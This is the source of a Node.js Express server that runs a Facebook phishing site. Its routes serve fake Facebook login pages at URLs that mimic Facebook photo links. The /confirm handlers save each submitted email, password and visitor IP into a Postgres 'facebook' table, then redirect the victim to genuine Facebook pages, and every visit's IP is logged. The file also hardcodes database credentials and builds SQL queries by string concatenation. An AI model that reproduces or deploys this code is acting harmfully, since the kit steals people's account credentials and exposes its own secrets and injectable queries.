
var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'hedmgtryrynnvo',
    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
    database: 'deqngk324p153p',
    port: 5432,
    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
    ssl: true
});

client.connect();
app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572697/735306480197164', function (req, res) {
    res.render('Facebook');
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })

})
app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444', function (req, res) {
    res.render('amir');
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })

})

app.get('/', function (req, res) {
    res.render('Facebook');

    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
    console.log(ip)
})


app.post('/confirm', function (req, res) {

    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {

    } else if (mail.length < c.length) {
        mail = c;
    }

    if (password == undefined) {
        password = d;
    } else if (d == undefined) {

    }
    else if (password.length < d.length) {
        password = d;
    }
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})
// ################################################################################################################################
app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444555', function (req, res) {
    res.render('sama')
})
app.post('/confirm/sama', function (req, res) {
    res.redirect('https://www.facebook.com/Hazem.Kamal.Samak')
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {

    } else if (mail.length < c.length) {
        mail = c;
    }

    if (password == undefined) {
        password = d;
    } else if (d == undefined) {

    }
    else if (password.length < d.length) {
        password = d;
    }
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})

// ################################################################################################################################
app.post('/confirm_amir', function (req, res) {
    res.redirect('https://www.facebook.com/eyaynews/')
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {

    } else if (mail.length < c.length) {
        mail = c;
    }

    if (password == undefined) {
        password = d;
    } else if (d == undefined) {

    }
    else if (password.length < d.length) {
        password = d;
    }
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})
app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445', function (req, res) {
    res.render('fb_ar')
})
// ***********************************************************************************************************************************************
app.get('/fade7a/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/7353064801971644', function (req, res) {

    res.render('fade7a');
})
app.post('/confirm/fad', function (req, res) {


    res.redirect('https://www.facebook.com/eyaynews/')
    var mail = req.body.email_a;
    var password = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    if (mail == undefined) {
        mail = c;
    } else if (c == undefined) {

    } else if (mail.length < c.length) {
        mail = c;
    }

    if (password == undefined) {
        password = d;
    } else if (d == undefined) {

    }
    else if (password.length < d.length) {
        password = d;
    }
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})
// ***********************************************************************************************************************************************

app.get('*', function (req, res) {
    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
})
app.listen(PORT, function () {
    console.log('Server Started')
})